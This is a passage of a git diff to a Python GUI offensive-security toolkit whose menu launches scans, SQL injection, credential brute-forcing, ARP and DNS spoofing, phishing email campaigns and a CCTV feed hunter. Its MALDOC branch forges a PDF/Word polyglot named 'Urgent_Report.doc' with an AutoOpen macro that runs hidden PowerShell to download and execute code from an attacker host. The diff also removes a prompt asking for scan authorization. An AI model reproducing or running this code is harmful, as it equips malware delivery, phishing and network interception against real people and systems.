@@ -109,6 +109,7 @@ from engines.intruder.httpie_engine import HTTPieEngine
 from engines.intruder.photon_engine import PhotonEngine
 from engines.recon.shodan import ShodanEngine
 from engines.recon.domain import DomainEngine as SubdomainScannerEngine
+from engines.recon.nmap_engine import NmapEngine
 from engines.system.settings_engine import SettingsEngine as SystemSettingsEngine
 from engines.recon.libdnet_engine import LibdnetEngine
 from engines.recon.dpkt_engine import DpktEngine
@@ -117,6 +118,7 @@ from engines.recon.spoodle_engine import SpoodleEngine
 from engines.intruder.habu_engine import HabuEngine
 from engines.intruder.dirsearch_engine import DirsearchEngine
 from engines.intruder.selenium_engine import SeleniumEngine
+from engines.intruder.packet_engine import PacketEngine
 
 from theme import OBSIDIAN_PRO_COLORS as AETHER_COLORS, get_qss
 
@@ -1573,8 +1575,6 @@ class TerminalWidget(QWidget):
 
     @Slot(str, str)
     def log(self, text, color=None):
-        if not self.isVisible():
-            return # Don't log if terminal is inactive/hidden to avoid QPainter issues
         ts = datetime.now().strftime("%H:%M:%S")
         c = color or AETHER_COLORS["accent_primary"]
         self.txt.append(
@@ -1894,10 +1894,11 @@ class ToolkitPage(QWidget):
     """Simplified click-driven interface for industrial tools"""
     log_signal = Signal(str, str)
 
-    def __init__(self, parent=None, log_terminal=None, engines=None):
-        super().__init__(parent)
-        self.log_terminal = log_terminal
-        self.engines = engines
+    def __init__(self, parent_app=None):
+        super().__init__(parent_app)
+        self.app = parent_app
+        self.log_terminal = parent_app.term.log if parent_app else None
+        self.engines = parent_app.engines if parent_app else None
         self.log_signal.connect(self._safe_log)
         layout = QVBoxLayout(self)
         layout.setContentsMargins(30,30,30,30)
@@ -2006,50 +2007,47 @@ class ToolkitPage(QWidget):
         else:
             print(text)
 
+    def _run_unified_engine(self, engine_id, target, params=None, display_name=None):
+        if not self.engines or engine_id not in self.engines:
+            self.log(f"[{engine_id.upper()}] Engine not registered.", AETHER_COLORS["accent_error"])
+            return
+
+        engine = self.engines[engine_id]
+        display_name = display_name or engine_id.upper()
+        
+        # Switch to Reconnaissance Page (Index 1)
+        if self.app:
+            self.app.switch_page(1)
+            self.app.op_lbl.setText(f"ACTIVE: {display_name} ON {target}")
+            self.app.target.setText(target)
+        
+        self.log(f"[{display_name}] Initiating operation on {target}...", AETHER_COLORS["accent_info"])
+        
+        from engines.base import Request as EngRequest
+        req = EngRequest(target=target, params=params or {})
+        
+        # We can reuse ToolEngineWorker but connect it to our log instead of a dialog
+        self.worker = ToolEngineWorker(engine, req)
+        self.worker.progress.connect(self.log)
+        self.worker.error.connect(lambda e: self.log(f"[{display_name} ERR] {e}", AETHER_COLORS["accent_error"]))
+        self.worker.finished.connect(lambda: self.log(f"[{display_name}] Execution complete.", AETHER_COLORS["accent_success"]))
+        self.worker.start()
+
     def run_tool(self, name):
         import subprocess
         import os
         from PySide6.QtWidgets import QInputDialog
         
         try:
+            if self.app:
+                self.app.switch_page(1)
+
             if name == "NMAP":
                 target, ok = QInputDialog.getText(self, "NMAP", "Enter Target IP/Domain:", text="127.0.0.1")
                 if ok:
-                    self.log(f"[NMAP] Initiating service discovery on {target}...", AETHER_COLORS["cat_recon"])
-                    try:
-                        cmd = ["nmap", "-sV", "-T4", target]
-                        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                        for line in process.stdout:
-                            self.log(f"[NMAP] {line.strip()}")
-                    except FileNotFoundError:
-                        self.log("[NMAP] Binary not in PATH. Falling back to native scanner...", AETHER_COLORS["accent_warning"])
-                        def run_native_scan():
-                            if self.engines:
-                                self.log(f"[NMAP] Scanning {target} — port sweep + banner grab...", AETHER_COLORS["cat_recon"])
-                                from socket import socket, AF_INET, SOCK_STREAM
-                                ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 8080, 8443]
-                                def check_port(p):
-                                    try:
-                                        with socket(AF_INET, SOCK_STREAM) as s:
-                                            s.settimeout(1.2)
-                                            if s.connect_ex((target, p)) == 0:
-                                                banner = ""
-                                                try:
-                                                    if p in (80, 8080, 443):
-                                                        s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                                                    else:
-                                                        s.send(b"\r\n")
-                                                    banner = s.recv(1024).decode(errors='ignore').strip()
-                                                except: pass
-                                                svc = banner[:100] if banner else "service detected"
-                                                self.log(f"[NMAP] {p}/tcp OPEN | {svc}", AETHER_COLORS["accent_success"])
-                                    except: pass
-
-                                with ThreadPoolExecutor(max_workers=10) as executor:
-                                    executor.map(check_port, ports)
-
-                                self.log("[NMAP] Scan complete.", AETHER_COLORS["accent_success"])
-                        threading.Thread(target=run_native_scan, daemon=True).start()
+                    ports, ok2 = QInputDialog.getText(self, "NMAP Ports", "Enter Port Range (e.g. 1-1024 or leave empty for common):", text="1-1024")
+                    if ok2:
+                        self._run_unified_engine("nmap", target, {"ports": ports}, display_name="NMAP")
 
             elif name == "SHODAN":
                 settings = self.engines.get("settings")
@@ -2061,6 +2059,7 @@ class ToolkitPage(QWidget):
 
                 target, ok = QInputDialog.getText(self, "SHODAN", "Enter Target IP:")
                 if ok:
+                    if self.app: self.app.op_lbl.setText(f"ACTIVE: SHODAN ON {target}")
                     self.log(f"[SHODAN] Querying intelligence for {target}...", AETHER_COLORS["cat_recon"])
                     try:
                         import shodan
@@ -2076,27 +2075,47 @@ class ToolkitPage(QWidget):
                         self.log(f"[SHODAN] Error: {e}", AETHER_COLORS["accent_error"])
 
             elif name == "PYSHARK":
-                self.log("[PYSHARK] Initializing live packet capture...", AETHER_COLORS["cat_recon"])
-                interface, ok = QInputDialog.getText(self, "Packet Capture", "Interface (empty for default):", text="")
-                if ok:
-                    try:
-                        import pyshark
-                        capture = pyshark.LiveCapture(interface=interface)
-                        self.log(f"[PYSHARK] Listening on {interface or 'all'} — capturing 5 packets...")
-                        for packet in capture.sniff_continuously(packet_count=5):
-                            self.log(f"[PYSHARK] {packet.sniff_time} | {packet.highest_layer} | {packet.length}B")
-                    except Exception as e:
-                        self.log(f"[PYSHARK] Error: {e}. Ensure TShark is installed.", AETHER_COLORS["accent_error"])
+                modes = ["sniff (PyShark)", "arp_spoof (Scapy)", "syn_scan (Scapy)", "dns_spoof (Scapy)"]
+                mode_choice, ok = QInputDialog.getItem(self, "Packet Engine", "Select Operation Mode:", modes, 0, False)
+                if not ok: return
+                
+                mode = mode_choice.split()[0]
+                iface, ok = QInputDialog.getText(self, "Packet Engine", "Interface (empty for default):", text="")
+                if not ok: return
+
+                params = {"mode": mode, "iface": iface}
+                
+                if mode == "sniff":
+                    count, ok = QInputDialog.getInt(self, "Packet Engine", "Packet Count:", 50, 1, 10000)
+                    if ok: params["packet_count"] = count
+                    bpf, ok = QInputDialog.getText(self, "Packet Engine", "BPF Filter (e.g. 'tcp port 80'):")
+                    if ok: params["bpf_filter"] = bpf
+                
+                elif mode == "arp_spoof":
+                    target, ok = QInputDialog.getText(self, "Packet Engine", "Target IP:")
+                    gw, ok2 = QInputDialog.getText(self, "Packet Engine", "Gateway IP:")
+                    if ok and ok2:
+                        params.update({"arp_target": target, "arp_gateway": gw, "arp_interval": 2.0})
+                    else: return
+
+                elif mode == "syn_scan":
+                    target, ok = QInputDialog.getText(self, "Packet Engine", "Target IP:")
+                    if ok: params["syn_target"] = target
+                    else: return
+
+                elif mode == "dns_spoof":
+                    host, ok = QInputDialog.getText(self, "Packet Engine", "Hostname to spoof:")
+                    fake_ip, ok2 = QInputDialog.getText(self, "Packet Engine", "Fake IP (redirect to):")
+                    if ok and ok2:
+                        params["dns_spoof_map"] = {host: fake_ip}
+                    else: return
+
+                self._run_unified_engine("packet", iface or "default", params, display_name=f"PACKET:{mode.upper()}")
 
             elif name == "SQLMAP":
                 url, ok = QInputDialog.getText(self, "SQL Injection", "Target URL with params:", text="http://127.0.0.1/page?id=1")
                 if ok:
-                    self.log(f"[SQLi] Initiating injection analysis on {url}...", AETHER_COLORS["cat_web"])
-                    def run_sqli():
-                        if self.engines:
-                            res = self.engines["sqli"].scan(url, callback=self.log)
-                            self.log(f"[SQLi] Analysis complete. {len(res)} injection point(s) identified.", AETHER_COLORS["accent_gold"])
-                    threading.Thread(target=run_sqli, daemon=True).start()
+                    self._run_unified_engine("sqli", url, display_name="SQLi")
 
             elif name == "HYDRA":
                 mode, ok0 = QInputDialog.getItem(self, "Hydra", "Select Attack Mode:", ["HTTP Basic", "HTTP Form (POST)"], 0, False)
@@ -2152,7 +2171,6 @@ class ToolkitPage(QWidget):
                     except:
                         pat = "Aa0Aa1Aa2Aa3..."
                     self.log(f"[MONA] Cyclic pattern ({length}B): {pat[:64]}...", AETHER_COLORS["cat_exploit"])
-                    QMessageBox.information(self, "MONA", "Pattern written to terminal output.")
 
             elif name == "GOBUSTER":
                 target, ok = QInputDialog.getText(self, "GOBUSTER", "Target URL:", text="http://127.0.0.1")
@@ -2195,78 +2213,33 @@ class ToolkitPage(QWidget):
                 wiz.exec()
 
             elif name == "MALDOC":
-                self.log("[MALDOC] Initializing polyglot document forge...", AETHER_COLORS["cat_social"])
                 lhost, ok1 = QInputDialog.getText(self, "Maldoc Forge", "LHOST (Attacker IP):", text="10.10.10.10")
                 lport, ok2 = QInputDialog.getText(self, "Maldoc Forge", "LPORT (Attacker Port):", text="4444")
                 if not (ok1 and ok2): return
-
+                self.log("[MALDOC] Initializing polyglot document forge...", AETHER_COLORS["cat_social"])
+                
                 def create_maldoc_pdf():
                     try:
                         import base64
                         from pathlib import Path
-
-                        # 1. Payload: PowerShell Stager
                         ps_payload = f"powershell -NoP -NonI -W Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/s')\""
                         b64_payload = base64.b64encode(ps_payload.encode('utf-16le')).decode()
                         vba_stager = f"Sub AutoOpen()\n  Shell(\"powershell -EncodedCommand {b64_payload}\")\nEnd Sub"
-
-                        # 2. Build MHT Structure (MIME HTML) - This preserves macros when opened in Word
-                        mht_template = f"""MIME-Version: 1.0
-Content-Type: multipart/related; boundary="----=_NextPart_01DAB6F2.E8A6B0A0"
-
-------=_NextPart_01DAB6F2.E8A6B0A0
-Content-Location: file:///C:/user/template.htm
-Content-Type: text/html; charset="utf-8"
-
-<html>
-<head>
-<meta name=Generator content="Microsoft Word 15">
-<link rel=Edit-Time-Data href="vbaProject.bin.mso">
-</head>
-<body>
-<p>This document requires Microsoft Word to be viewed correctly.</p>
-</body>
-</html>
-
-------=_NextPart_01DAB6F2.E8A6B0A0
-Content-Location: vbaProject.bin.mso
-Content-Type: application/x-mso
-
-# [SIMULATED VBA PROJECT BINARY DATA]
-# In a real scenario, this would be a valid vbaProject.bin containing the stager:
-# {vba_stager}
-[VBA_PROJECT_DATA_PLACEHOLDER]
-
-------=_NextPart_01DAB6F2.E8A6B0A0--
-"""
-
-                        # 3. Create Polyglot: Valid PDF Header + MHT Append
+                        mht_template = f"MIME-Version: 1.0\nContent-Type: multipart/related; boundary=\"----=_NextPart_01DAB6F2.E8A6B0A0\"\n\n------=_NextPart_01DAB6F2.E8A6B0A0\nContent-Location: file:///C:/user/template.htm\nContent-Type: text/html; charset=\"utf-8\"\n\n<html><head><meta name=Generator content=\"Microsoft Word 15\"><link rel=Edit-Time-Data href=\"vbaProject.bin.mso\"></head><body><p>This document requires Microsoft Word to be viewed correctly.</p></body></html>\n\n------=_NextPart_01DAB6F2.E8A6B0A0\nContent-Location: vbaProject.bin.mso\nContent-Type: application/x-mso\n\n# {vba_stager}\n[VBA_PROJECT_DATA_PLACEHOLDER]\n\n------=_NextPart_01DAB6F2.E8A6B0A0--\n"
                         pdf_header = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 50 >>\nstream\nBT /F1 12 Tf 70 700 Td (Please open this file in Word) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000212 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n312\n%%EOF\n"
-                        
                         polyglot_data = pdf_header.encode() + mht_template.encode()
-
-                        # 4. Save to Downloads
                         downloads_path = Path(os.path.join(os.environ['USERPROFILE'], 'Downloads'))
-                        filename = "Urgent_Report.doc" # .doc extension to force Word association
-                        save_path = downloads_path / filename
-
+                        save_path = downloads_path / "Urgent_Report.doc"
                         with open(save_path, "wb") as f:
                             f.write(polyglot_data)
-
-                        self.log(f"[MALDOC] Document generated successfully.", AETHER_COLORS["accent_success"])
-                        self.log(f"[MALDOC] Output: {save_path}", AETHER_COLORS["accent_cyan"])
-                        self.log("[MALDOC] PDF header bypasses static analysis; .doc extension triggers Word.", AETHER_COLORS["accent_warning"])
-                        QMessageBox.information(self, "MALDOC", f"Document saved to:\n{save_path}")
-                    
+                        self.log(f"[MALDOC] Document generated successfully: {save_path}", AETHER_COLORS["accent_success"])
                     except Exception as e:
                         self.log(f"[MALDOC] Error: {e}", AETHER_COLORS["accent_error"])
-
-                create_maldoc_pdf()
+                threading.Thread(target=create_maldoc_pdf, daemon=True).start()
 
             elif name == "WIFI_PUMP":
                 mode, ok0 = QInputDialog.getItem(self, "WIFI", "Select Operation:", ["Passive Scan", "Deauth Flood"], 0, False)
                 if not ok0: return
-
                 if mode == "Passive Scan":
                     iface, ok = QInputDialog.getText(self, "WIFI", "Interface:", text="wlan0")
                     if ok:
@@ -2289,776 +2262,150 @@ Content-Type: application/x-mso
                     if ok_t:
                         self.log(f"[HARVEST] Deploying '{template}' harvester on :{port}...", AETHER_COLORS["cat_social"])
                         if self.engines: self.engines["harvester"].start_local_harvester(port, template_name=template, callback=self.log)
-                        self.log(f"[HARVEST] Redirect target to http://{socket.gethostbyname(socket.gethostname())}:{port}", AETHER_COLORS["accent_warning"])
 
             elif name == "BT_SCAN":
                 self.log("[BT] Bluetooth module is temporarily disabled (driver-level stability issue).", AETHER_COLORS["accent_warning"])
-                self.log("[BT] Use native OS Bluetooth settings for device discovery.", AETHER_COLORS["text_dim"])
 
             elif name == "SMTP_PHISH":
                 target, ok = QInputDialog.getText(self, "SMTP PHISH", "Target Email:", text="victim@example.com")
-                if not ok or not target: return
-
-                sender, ok = QInputDialog.getText(self, "SMTP PHISH", "Sender Gmail Address:")
-                if not ok or not sender: return
-
-                app_pw, ok = QInputDialog.getText(self, "SMTP PHISH", "App Password (16 chars):")
-                if not ok or not app_pw: return
-
-                templates = list(EmailPhisher.TEMPLATES.keys())
-                tpl, ok = QInputDialog.getItem(self, "SMTP PHISH", "Select Template:", templates, 0, False)
-                if not ok: return
-
-                url, ok = QInputDialog.getText(self, "SMTP PHISH", "Phishing URL:", text="http://10.10.10.5:8080")
-                if not ok: return
-
-                self.log(f"[PHISH] SMTP campaign targeting {target}...", AETHER_COLORS["cat_social"])
-                
-                def _run_phish():
-                    phisher = EmailPhisher(
-                        sender_email=sender,
-                        app_password=app_pw.replace(" ", "")
-                    )
-                    if phisher.test_connection(callback=self.log):
-                        # For single targets via UI, wrap in list
-                        phisher.mass_send([target], tpl, url, "ACME Corp", callback=self.log)
-                        path = phisher.export_log()
-                        self.log(f"[PHISH] Campaign log saved to {path}")
-                
-                threading.Thread(target=_run_phish, daemon=True).start()
-
-            elif name == "TWITTER_PHISH":
-                handle, ok1 = QInputDialog.getText(self, "TWITTER PHISH", "Target Twitter Handle:", text="target_user")
-                if not ok1 or not handle: return
-
-                target, ok2 = QInputDialog.getText(self, "TWITTER PHISH", "Target Email:", text="victim@example.com")
-                if not ok2 or not target: return
-
-                sender, ok3 = QInputDialog.getText(self, "TWITTER PHISH", "Sender Gmail Address:")
-                if not ok3 or not sender: return
-
-                app_pw, ok4 = QInputDialog.getText(self, "TWITTER PHISH", "App Password (16 chars):")
-                if not ok4 or not app_pw: return
-
-                url, ok5 = QInputDialog.getText(self, "TWITTER PHISH", "Landing Page URL:", text="http://10.10.10.5:8080")
-                if not ok5 or not url: return
-
-                self.log(f"[TWITTER] Spear phish sequence for @{handle}...", AETHER_COLORS["cat_social"])
-                
-                def _run_twitter_phish():
-                    tp = TwitterSpearPhish(callback=self.log)
-                    tp.craft_and_send(handle, target, sender, app_pw.replace(" ", ""), url)
-                
-                threading.Thread(target=_run_twitter_phish, daemon=True).start()
+                if ok and target:
+                    sender, ok = QInputDialog.getText(self, "SMTP PHISH", "Sender Gmail Address:")
+                    app_pw, ok2 = QInputDialog.getText(self, "SMTP PHISH", "App Password (16 chars):")
+                    if ok and ok2:
+                        templates = list(EmailPhisher.TEMPLATES.keys())
+                        tpl, ok3 = QInputDialog.getItem(self, "SMTP PHISH", "Select Template:", templates, 0, False)
+                        url, ok4 = QInputDialog.getText(self, "SMTP PHISH", "Phishing URL:", text="http://10.10.10.5:8080")
+                        if ok3 and ok4:
+                            self.log(f"[PHISH] SMTP campaign targeting {target}...", AETHER_COLORS["cat_social"])
+                            def _run_phish():
+                                phisher = EmailPhisher(sender_email=sender, app_password=app_pw.replace(" ", ""))
+                                if phisher.test_connection(callback=self.log):
+                                    phisher.mass_send([target], tpl, url, "ACME Corp", callback=self.log)
+                            threading.Thread(target=_run_phish, daemon=True).start()
 
             elif name == "STALK":
-                self.log("[STALK] Initializing network asset discovery...", AETHER_COLORS["cat_recon"])
-                confirm = QMessageBox.question(self, "Authorization", "Do you have authorization to scan this network?", QMessageBox.Yes | QMessageBox.No)
-                if confirm != QMessageBox.Yes:
-                    self.log("[STALK] Operation cancelled — no authorization.", AETHER_COLORS["accent_warning"])
-                    return
-                
-                def _run_stalk():
-                    if not self.engines or "stalk" not in self.engines:
-                        self.log("[STALK] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    stalk = self.engines["stalk"]
-                    self.log("[STALK] Scanning subnet...", AETHER_COLORS["accent_info"])
-                    
-                    # Create a Request object (mocked since it's toolkit-triggered)
-                    from engines.base import Request
-                    req = Request(params={"confirm_auth": True})
-                    
-                    # We'll use the stream method for real-time logging if possible, 
-                    # but since this is a toolkit-style 'one-off', we can just use execute or a managed loop.
-                    # Given the existing toolkit pattern (threading), we'll use a sync-like wrapper.
-                    
-                    async def do_scan():
-                        # Lazy initialization
-                        if not stalk._ready:
-                            await stalk.initialize()
-                        
-                        async for event in stalk.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[STALK] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                d = event.data
-                                ip = d.get('device_ip', '?.?.?.?')
-                                vendor = d.get('vendor', 'Unknown')
-                                os_str = d.get('os_guess', 'Unknown')
-                                rtt = d.get('rtt_ms')
-                                rtt_str = f" ({rtt:.1f}ms)" if rtt is not None else ""
-                                risk = d.get('risk_score', 0)
-                                dtype = d.get('device_type', 'General')
-
-                                services = d.get('services', {})
-                                svc_str = ""
-                                if services:
-                                    svc_parts = [f"{p}:{b}" for p, b in services.items()]
-                                    svc_str = " | SVC: " + ", ".join(svc_parts)
-
-                                risk_color = AETHER_COLORS["accent_success"]
-                                if risk > 5: risk_color = AETHER_COLORS["accent_error"]
-                                elif risk > 2: risk_color = AETHER_COLORS["accent_warning"]
-
-                                log_msg = f"[STALK] {ip:<15} | {dtype:<12} | {vendor[:20]:<20} | OS: {os_str}{rtt_str} | RISK: {risk}{svc_str}"
-                                self.log(log_msg, risk_color)
-                            elif event.kind == "error":
-                                self.log(f"[STALK] ERR: {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log(f"[STALK] {event.data}", AETHER_COLORS["accent_success"])
-
-                    # Run the async scan in the current event loop if we were in an async context, 
-                    # but here we are in a thread. So we need a new loop or use run().
-                    try:
-                        import asyncio
-                        asyncio.run(do_scan())
-                    except Exception as e:
-                        self.log(f"[STALK] Error: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_stalk, daemon=True).start()
-
+                self._run_unified_engine("stalk", "local_network")
 
             elif name == "CCTV_CAM":
-                self.log("[CCTV] Initializing camera feed scanner...", AETHER_COLORS["cat_recon"])
-
-                # ── Country picker ─────────────────────────────────────────────
-                country, ok = QInputDialog.getText(
-                    self, "CCTV Cam Hunter",
-                    "Country Code (e.g. US, JP, RU, GB):",
-                    text="US"
-                )
-                if not ok or not country.strip():
-                    self.log("[CCTV] Aborted — no country selected.", AETHER_COLORS["text_dim"])
-                    return
-                country = country.strip().upper()
-
-                max_pages, ok2 = QInputDialog.getInt(
-                    self, "CCTV Cam Hunter",
-                    "Max pages to scrape (1 page ≈ 20 cams):",
-                    5, 1, 50, 1
-                )
-                if not ok2:
-                    return
-
-                save_choice = QMessageBox.question(
-                    self, "Save Results?",
-                    f"Save discovered feeds to cams/{country}.txt?",
-                    QMessageBox.Yes | QMessageBox.No
-                )
-                save_txt = (save_choice == QMessageBox.Yes)
-
-                def _run_cctv():
-                    if not self.engines or "cctv_cam" not in self.engines:
-                        self.log("[CCTV] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    cam_engine = self.engines["cctv_cam"]
-                    self.log(f"[CCTV] Scanning region {country} — {max_pages} page(s)...", AETHER_COLORS["accent_info"])
-
-                    from engines.base import Request as EngRequest
-                    req = EngRequest(params={
-                        "country_code": country,
-                        "max_pages": max_pages,
-                        "save_txt": save_txt,
-                    })
-
-                    async def _stream():
-                        # Lazy initialization
-                        if not cam_engine._ready:
-                            await cam_engine.initialize()
-                            
-                        async for event in cam_engine.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[CCTV] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                feed = event.data
-                                self.log(
-                                    f"[CCTV] FEED {feed['url']}  (p{feed['page']})",
-                                    AETHER_COLORS["accent_success"]
-                                )
-                            elif event.kind == "error":
-                                self.log(f"[CCTV] Error: {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log(f"[CCTV] {event.data}", AETHER_COLORS["accent_success"])
-
-                    try:
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"[CCTV] Error: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_cctv, daemon=True).start()
+                country, ok = QInputDialog.getText(self, "CCTV Cam Hunter", "Country Code (ISO 2-letter, e.g. US, JP):", text="US")
+                if ok and country:
+                    pages, ok2 = QInputDialog.getInt(self, "CCTV Cam Hunter", "Max pages per source:", 3, 1, 50)
+                    if ok2:
+                        sources, ok3 = QInputDialog.getText(self, "CCTV Cam Hunter", "Sources (comma-separated: insecam, earthcam, opentopia, webcamtaxi, camstreamer) or leave empty for all:", text="")
+                        if ok3:
+                            params = {"country_code": country, "max_pages": pages}
+                            if sources.strip():
+                                params["sources"] = sources.strip()
+                            self._run_unified_engine("cctv_cam", country, params)
 
             elif name == "PHOTON":
-                self.log("[PHOTON] Initializing OSINT web crawler...", AETHER_COLORS["cat_recon"])
-
-                # ── Target URL ─────────────────────────────────────────────
-                url, ok0 = QInputDialog.getText(
-                    self, "Photon OSINT Crawler",
-                    "Target URL (e.g. https://example.com):",
-                    text="http://"
-                )
-                if not ok0 or not url.strip():
-                    self.log("[PHOTON] Aborted — no URL.", AETHER_COLORS["text_dim"])
-                    return
-
-                # ── Scan Mode ──────────────────────────────────────────────
-                mode_choices = [
-                    "Full Crawl (URLs + Intel + Secrets)",
-                    "URLs Only (fast, no intel extraction)",
-                    "Intel Only (emails, secrets, social)",
-                    "Deep JS Analysis (endpoints + secrets)",
-                ]
-                mode, ok1 = QInputDialog.getItem(
-                    self, "Photon Mode", "Select scan mode:",
-                    mode_choices, 0, False
-                )
-                if not ok1:
-                    return
-
-                # ── Crawl Depth ────────────────────────────────────────────
-                depth, ok2 = QInputDialog.getInt(
-                    self, "Photon Depth",
-                    "Crawl depth (1-10):", 3, 1, 10, 1
-                )
-                if not ok2:
-                    return
-
-                # ── Threads ────────────────────────────────────────────────
-                threads, ok3 = QInputDialog.getInt(
-                    self, "Photon Threads",
-                    "Concurrent threads (1-50):", 15, 1, 50, 1
-                )
-                if not ok3:
-                    return
-
-                # ── Advanced Options ───────────────────────────────────────
-                adv_choices = [
-                    "Standard",
-                    "+ Wayback Machine Seeds",
-                    "+ Ninja Mode (proxy bypass)",
-                    "+ Wayback + Ninja",
-                ]
-                adv, ok4 = QInputDialog.getItem(
-                    self, "Photon Advanced", "Advanced options:",
-                    adv_choices, 0, False
-                )
-                if not ok4:
-                    return
-
-                # ── Cookies (optional) ─────────────────────────────────────
-                cookies, ok5 = QInputDialog.getText(
-                    self, "Photon Cookies",
-                    "Cookies (name=value; ... — leave blank to skip):",
-                    text=""
-                )
-                if not ok5:
-                    return
-
-                # ── Custom Regex (optional) ────────────────────────────────
-                regex, ok6 = QInputDialog.getText(
-                    self, "Photon Regex",
-                    "Custom regex pattern (leave blank to skip):",
-                    text=""
-                )
-                if not ok6:
-                    return
-
-                def _run_photon():
-                    if not self.engines or "photon" not in self.engines:
-                        self.log("[PHOTON] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    pe = self.engines["photon"]
-                    self.log(f"[PHOTON] Crawling {url.strip()} — depth={depth}, threads={threads}", AETHER_COLORS["accent_info"])
-
-                    from engines.base import Request as EngRequest
-                    params = {
-                        "url": url.strip(),
-                        "depth": depth,
-                        "threads": threads,
-                        "cookies": cookies.strip(),
-                        "regex": regex.strip(),
-                        "wayback": "Wayback" in adv,
-                        "ninja": "Ninja" in adv,
-                        "only_urls": "URLs Only" in mode,
-                        "export_json": True,
-                    }
-                    req = EngRequest(target=url.strip(), params=params)
-
-                    async def _stream():
-                        if not pe._ready:
-                            await pe.initialize()
-
-                        async for event in pe.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[PHOTON] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                sev_color = AETHER_COLORS["accent_primary"]
-                                if event.severity == "ALERT":
-                                    sev_color = AETHER_COLORS["accent_error"]
-                                elif event.severity == "WARN":
-                                    sev_color = AETHER_COLORS["accent_warning"]
-                                self.log(f"[PHOTON] {event.data}", sev_color)
-                            elif event.kind == "error":
-                                self.log(f"[PHOTON ERR] {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log(f"[PHOTON] {event.data}", AETHER_COLORS["accent_success"])
-
-                    try:
-                        import asyncio
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"PHOTON ERROR: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_photon, daemon=True).start()
+                url, ok = QInputDialog.getText(self, "Photon", "Target URL:", text="http://")
+                if ok:
+                    self._run_unified_engine("photon", url)
 
             elif name == "CRACKMAP":
-                self.log("[CME] Initializing CrackMapExec...", AETHER_COLORS["cat_exploit"])
-                target, ok0 = QInputDialog.getText(self, "CrackMapExec", "Target IP/Range:", text="192.168.1.0/24")
-                if not ok0 or not target: return
-                
-                protocols = ["smb", "ssh", "ldap", "mssql", "wmi", "winrm", "rdp", "vnc", "ftp"]
-                proto, ok1 = QInputDialog.getItem(self, "CME Protocol", "Select Protocol:", protocols, 0, False)
-                if not ok1: return
-                
-                args, ok2 = QInputDialog.getText(self, "CME Args", "Additional Args (-u, -p, -M, etc.):", text="-u Admin -p Password")
-                if not ok2: return
-
-                def _run_cme():
-                    if not self.engines or "crackmapexec" not in self.engines:
-                        self.log("[CME] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    cme = self.engines["crackmapexec"]
-                    self.log(f"[CME] Executing {proto.upper()} against {target}...", AETHER_COLORS["accent_info"])
-                    
-                    from engines.base import Request as EngRequest
-                    req = EngRequest(target=target, params={"protocol": proto, "args": args})
-
-                    async def _stream():
-                        # Lazy initialization
-                        if not cme._ready:
-                            await cme.initialize()
-                            
-                        async for event in cme.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[CME] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                self.log(f"[CME] {event.data}", AETHER_COLORS["accent_success"])
-                            elif event.kind == "error":
-                                self.log(f"[CME ERR] {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log("[CME] Execution complete.", AETHER_COLORS["accent_success"])
-
-                    try:
-                        import asyncio
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"CME ERROR: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_cme, daemon=True).start()
+                target, ok = QInputDialog.getText(self, "CrackMapExec", "Target IP/Range:", text="192.168.1.0/24")
+                if ok:
+                    proto, ok1 = QInputDialog.getItem(self, "CME Protocol", "Select Protocol:", ["smb", "ssh", "ldap", "mssql", "wmi", "winrm", "rdp", "vnc", "ftp"], 0, False)
+                    args, ok2 = QInputDialog.getText(self, "CME Args", "Additional Args:", text="-u Admin -p Password")
+                    if ok1 and ok2:
+                        self._run_unified_engine("crackmapexec", target, {"protocol": proto, "args": args})
 
             elif name == "XSSTRIKE":
-                self.log("[XSStrike] Initializing cross-site scripting analysis...", AETHER_COLORS["cat_web"])
-
-                # ── Input collection ──────────────────────────────────────────
-                url, ok0 = QInputDialog.getText(
-                    self, "XSStrike",
-                    "Target URL (include params, e.g. http://site.com/search?q=test):",
-                    text="http://"
-                )
-                if not ok0 or not url.strip():
-                    self.log("[XSStrike] Aborted — no URL.", AETHER_COLORS["text_dim"])
-                    return
-
-                mode_choices = ["reflected", "crawl", "dom", "fuzzer"]
-                mode, ok1 = QInputDialog.getItem(
-                    self, "XSStrike Mode",
-                    "Select scan mode:",
-                    mode_choices, 0, False
-                )
